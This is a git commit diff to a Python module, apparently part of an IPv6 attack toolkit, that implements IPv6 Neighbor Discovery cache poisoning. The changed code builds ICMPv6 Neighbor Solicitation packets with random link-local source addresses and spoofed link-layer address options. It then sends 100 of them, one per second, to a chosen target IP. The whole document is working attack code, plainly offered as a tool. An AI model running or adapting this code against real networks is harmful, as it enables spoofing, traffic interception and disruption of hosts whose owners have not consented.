0b6e58e16bbb2d07957b7d0f8902dfa3255b1adf
Ronald Eddings <ronaldeddings@gmail.com>
2017-06-15 17:20:21 -0700

    Update ND_Cache_Poisoning.py

--- modules/ND_Cache_Poisoning.py
+++ modules/ND_Cache_Poisoning.py
@@ -3,6 +3,8 @@ from copy import copy
 import sys
 from multiprocessing.pool import ThreadPool, Pool
 from template import Template
+import random  
+import time
 
 sys.path.insert(0,'..')
 from ipv6.ipv6 import createIPv6, get_source_address, grabRawDst, grabRawSrc, getMacAddress
@@ -15,22 +17,15 @@ class IPv6Module(Template):
         self.actions = [
             {
                 "title": "ND Cache Poisoning",
-                "action": "action"
+                "action": "action",
+                "target": True
             },
-            {
-                "title": "ND Cache Poisoning",
-                "action": "action"
-            },
-            {
-                "title": "Stop ND Cache Poisoning",
-                "action": "stop_sniffer"
-            }
         ]
 
     def action(self, target=None):
         self.sniffer = IPv6Sniffer(self)
         self.socket_log('Sniffer intitialized.')
-        self.sniffer.start()
+        self.sniffer.start(target)
 
     def stop_sniffer(self, msg):
         try:
@@ -47,17 +42,19 @@ class IPv6Sniffer:
         self.mod = mod
 
     # initialize the listener
-    def start(self):
+    def start(self,target):
         print("sniffer intialized")
         self.stopped = False
         self.pool = ThreadPool(processes=1)
-        self.pool.apply_async(self.send)
+        self.pool.apply_async(self.send,[target])
         # self.listen()
 
     # start the listener
-    def send(self):
-        while True:
-            self.cache_poison()
+    def send(self,target):
+        counter = 0
+        while counter < 100:
+            self.cache_poison(target)
+            counter += 1
 
     # stop the listener
     def stop(self):
@@ -69,42 +66,31 @@ class IPv6Sniffer:
     def stopfilter(self, packet):
         return self.stopped
 
-    # callback for when packets are received
-    def callback(self, packet):
-        res = {}
-        res['ip'] = packet[IPv6].src
-        channel = False
-        if ICMPv6ND_NS in packet:
-            channel = 'module_output'
-            try:
-                self.cache_poison(packet)
-            except Exception,e:
-                exc_info = sys.exc_info()
-                traceback.print_exception(*exc_info)
-                #print e
-
-    def cache_poison(self, dst=get_source_address(IPv6(dst="ff02::1"))):
-        import random   
+    def cache_poison(self, target, dst=get_source_address(IPv6(dst="ff02::1"))):
         M = 16**4
-        src = "fe80:" + ":".join(("%x" % random.randint(0, M) for i in range(6)))
+        src = "fe80::" + ":".join(("%x" % random.randint(0, M) for i in range(4)))
+        
         lladdr = getMacAddress(src)
 
         ip_packet = createIPv6()
-        ip_packet.fields["nh"] = 58 #ICMPv6
+        ip_packet.fields["version"] = 6L
+        ip_packet.fields["tc"] = 0L
+        ip_packet.fields["nh"] = 58
         ip_packet.fields["hlim"] = 255
         ip_packet.fields["src"] = src
-        ip_packet.fields["dst"] = dst
+        ip_packet.fields["dst"] = target["ip"]
 
-        tgt = packet[ICMPv6ND_NS].fields["tgt"]
+        icmp_packet = ICMPv6ND_NS()
+        icmp_packet.fields["code"] = 0
+        icmp_packet.fields["res"] = 0
+        icmp_packet.fields["type"] = 135
+        icmp_packet.fields["tgt"] = target["ip"]
 
-        solicitation = ICMPv6ND_NS()
-        solicitation.fields["tgt"] = src
-        
-        options = ICMPv6NDOptSrcLLAddr()
-        options.fields["lladdr"] = lladdr
+        llpacket = ICMPv6NDOptSrcLLAddr()
+        llpacket.fields["type"] = 1
+        llpacket.fields["len"] = 1
+        llpacket.fields["lladdr"] = lladdr
 
-        # TODO: Add continuous sending of this packet
-        out = "ND_Cache: Poisoning Started"
-        send(ip_packet/solicitation/options)
-        self.mod.socket_log(out)
-        print out
+        send(ip_packet/icmp_packet/llpacket)
+
+        time.sleep(1)
